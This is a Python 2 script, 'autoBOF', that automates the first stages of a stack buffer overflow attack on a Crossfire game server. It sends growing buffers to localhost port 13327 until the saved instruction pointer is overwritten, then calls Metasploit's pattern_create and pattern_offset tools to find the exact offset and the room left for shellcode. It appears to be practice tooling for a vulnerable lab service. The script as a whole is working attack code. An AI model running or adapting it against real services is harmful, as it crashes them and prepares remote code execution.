#!/usr/bin/python
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
os.system("figlet autoBOF") #Optional but very important dependency
host = "127.0.0.1"
port = 13327
buffer = ('\x41')
start = "\x11(setup sound "
end = "\x90\x00#"
isSuccess = False
overflow = buffer
max = sys.argv[1]
tryUntil = int(max)
startCount = 4368
increment = 1
print "---- Attempting to Crash Service ----"
while(startCount < tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  print "fuzzing at", startCount, "bytes", "out of", tryUntil #DEBUG
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(1)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   print "---- Service Crashed With EIP overwrite ----"
   print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   print "---- Service Crashed With EIP overwrite ----"
   print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
#s.close() #original
if(not isSuccess):
 print "---- Service is Resilient  ----"
 print("No overflow up to"),tryUntil,"bytes"
 sys.exit()

#END OVERFLOW DETECTION
print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount) #EDIT BACK TO INCREMENT
bashCommand = bashCommand + strTest + " > offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
#copied code section
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
print("Unique Buffer Sent")
print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(1)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
start = eipValue.find("0x")
eipValue = eipValue[start:(start+10)]
print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " > offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
start = offset.find("offset")+7
offset = offset[start:]
offset = offset.strip('\n')
offset = int(offset)
print "Offset is at", offset, "bytes with", (startCount-offset), "bytes of post-offset shellcode space"
